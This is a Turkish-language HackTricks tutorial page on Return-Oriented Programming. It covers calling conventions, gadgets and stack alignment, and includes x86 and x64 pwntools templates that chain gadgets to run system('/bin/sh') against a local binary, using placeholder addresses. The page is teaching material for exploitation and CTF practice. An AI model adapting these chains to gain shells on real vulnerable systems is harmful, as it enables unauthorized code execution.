# ROP - Return Oriented Programing

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın**.

</details>

## **Temel Bilgiler**

**Return-Oriented Programming (ROP)**, **No-Execute (NX)** veya **Data Execution Prevention (DEP)** gibi güvenlik önlemlerini atlatmak için kullanılan gelişmiş bir istismar tekniğidir. Bir saldırgan, kabuk kodu enjekte etmek ve yürütmek yerine, ikili dosyada veya yüklenmiş kütüphanelerde zaten bulunan kod parçalarını, yani **"gadget"**'ları kullanır. Her gadget genellikle bir `ret` talimatı ile biter ve veri taşıma veya aritmetik işlemler gibi küçük bir işlem gerçekleştirir. Bu gadget'ları bir araya getirerek, bir saldırgan, NX/DEP korumalarını atlayarak keyfi işlemler gerçekleştirmek için bir yük oluşturabilir.

### ROP Nasıl Çalışır

1. **Kontrol Akışı Kaçırma**: İlk olarak, bir saldırganın bir programın kontrol akışını kaçırması gerekir, genellikle bir tampon taşması kullanarak yığın üzerinde kaydedilmiş bir dönüş adresini üzerine yazarak.
2. **Gadget Zinciri**: Saldırgan daha sonra istenen işlemleri gerçekleştirmek için dikkatlice gadget'ları seçer ve birbirine bağlar. Bu, bir işlev çağrısı için argümanları ayarlamayı, işlevi çağırmayı (örneğin, `system("/bin/sh")`), ve gerekli temizlik veya ek işlemleri ele almayı içerebilir.
3. **Yük Yürütme**: Zayıf işlev geri döndüğünde, meşru bir konuma dönüş yapmak yerine, gadget zincirini yürütmeye başlar.

## x86 Örneğinde ROP Zinciri

### **x86 (32-bit) Çağrı Kuralları**

* **cdecl**: Çağrı yapan yığını temizler. İşlev argümanları sağdan sola doğru yığın üzerine itilir. **Argümanlar sağdan sola doğru yığın üzerine itilir.**
* **stdcall**: cdecl'ye benzer, ancak yığını temizleme işlemi çağrıyı alanın sorumluluğundadır.

### **Gadget Bulma**

İlk olarak, ikili dosyada veya yüklenmiş kütüphanelerde gerekli gadget'ları tanımladığımızı varsayalım. İlgilendiğimiz gadget'lar şunlardır:

* `pop eax; ret`: Bu gadget, yığının en üst değerini `EAX` kaydedicisine iter ve ardından dönüş yaparak `EAX` üzerinde kontrol sağlar.
* `pop ebx; ret`: Yukarıdakiyle benzer, ancak `EBX` kaydedicisi için, `EBX` üzerinde kontrol sağlar.
* `mov [ebx], eax; ret`: `EAX` içindeki değeri `EBX` tarafından işaret edilen bellek konumuna taşır ve ardından dönüş yapar.
* Ayrıca, `system()` işlevinin adresine sahibiz.

### **ROP Zinciri**

**pwntools** kullanarak, ROP zinciri yürütmesi için yığını aşağıdaki gibi hazırlıyoruz, `system('/bin/sh')`'yi yürütmeyi amaçlayarak, zincirin aşağıdaki gibi başladığına dikkat edin:

1. Hizalama amaçlı bir `ret` talimatı (isteğe bağlı)
2. `system` işlevinin adresi (ASLR devre dışı bırakılmış ve bilinen libc varsayılarak, daha fazla bilgi için [**Ret2lib**](ret2lib/))
3. `system()`'dan dönüş adresi için yer tutucu
4. `"/bin/sh"` dizesi adresi (sistem işlevi için parametre)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## x64 Örneğinde ROP Zinciri

### **x64 (64-bit) Çağrı Kuralları**

* Unix benzeri sistemlerde **System V AMD64 ABI** çağrı kuralını kullanır, burada **ilk altı tamsayı veya işaretçi argüman `RDI`, `RSI`, `RDX`, `RCX`, `R8` ve `R9`** registerlerine iletilir. Ek argümanlar yığına iletilir. Dönüş değeri `RAX` registerine yerleştirilir.
* **Windows x64** çağrı kuralı ilk dört tamsayı veya işaretçi argümanlar için `RCX`, `RDX`, `R8` ve `R9` kullanır, ek argümanlar yığına iletilir. Dönüş değeri `RAX` registerine yerleştirilir.
* **Registerler**: 64-bit registerler arasında `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` ve `R8` ile `R15` bulunur.

#### **Gadget'lar Bulma**

Amacımız, **RDI** registerini ayarlamamıza ( **system()** fonksiyonuna **"/bin/sh"** dizesini argüman olarak iletmek için) ve ardından **system()** fonksiyonunu çağırmamıza izin verecek gadget'ları bulmaya odaklanalım. Aşağıdaki gadget'ları tanımladığımızı varsayalım:

* **pop rdi; ret**: Yığının en üst değerini **RDI** registerine çıkarır ve ardından döner. **system()** için argümanımızı ayarlamak için temel öneme sahiptir.
* **ret**: Basit bir dönüş, bazı senaryolarda yığın hizalaması için kullanışlıdır.

Ve **system()** fonksiyonunun adresini biliyoruz.

### **ROP Zinciri**

Aşağıda, **system('/bin/sh')**'yi çalıştırmayı amaçlayan bir ROP zinciri oluşturmak ve yürütmek için **pwntools** kullanarak bir örnek bulunmaktadır:
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
### Stack Alignment

**x86-64 ABI**, bir **çağrı talimatı** yürütüldüğünde **yığının 16 bayt hizalandığını** sağlar. **LIBC**, performansı optimize etmek için **SSE talimatları** (örneğin **movaps**) kullanır ve bu hizalamayı gerektirir. Eğer yığın düzgün hizalanmamışsa (yani **RSP** 16'nın katı değilse), **ROP zincirinde** **system** gibi fonksiyonlara yapılan çağrılar başarısız olacaktır. Bunun düzeltilmesi için ROP zincirinizde **system**'i çağırmadan önce bir **ret gadget** ekleyin.

## x86 vs x64 ana farkı

{% hint style="success" %}
x64, ilk birkaç argüman için kayıtları kullandığından, basit fonksiyon çağrıları için genellikle x86'dan daha az gadget gerektirir, ancak doğru gadget'ları bulmak ve zincirlemek, artan kayıt sayısı ve daha büyük adres alanı nedeniyle daha karmaşık olabilir. **x64** mimarisinde artan kayıt sayısı ve daha büyük adres alanı, özellikle Return-Oriented Programming (ROP) bağlamında, hem fırsatlar hem de zorluklar sunar.
{% endhint %}

## Korumalar

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Yığın Kanaryaları**](../common-binary-protections-and-bypasses/stack-canaries/)

## Diğer Örnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## ROP tabanlı teknikler

ROP'un yalnızca keyfi kodu yürütmek için bir teknik olduğunu unutmayın. ROP'a dayalı birçok Ret2XXX tekniği geliştirilmiştir:

* **Ret2lib**: ROP'u yüklenmiş bir kütüphaneden keyfi parametrelerle keyfi işlevleri çağırmak için kullanın (genellikle `system('/bin/sh')` gibi).

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: ROP'u bir sistem çağrısını hazırlamak için kullanın, örneğin `execve`, ve bunu keyfi komutları yürütmek için kullanın.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret ve EBP Zincirleme**: İlk olarak, akışı kontrol etmek için EIP yerine EBP'yi kötüye kullanacak ve ikincisi Ret2lib'e benzer ancak bu durumda akış genellikle EBP adresleriyle kontrol edilir (ancak EIP'nin de kontrol edilmesi gerekmektedir).

{% content-ref url="ebp2ret-ebp-chaining.md" %}
[ebp2ret-ebp-chaining.md](ebp2ret-ebp-chaining.md)
{% endcontent-ref %}
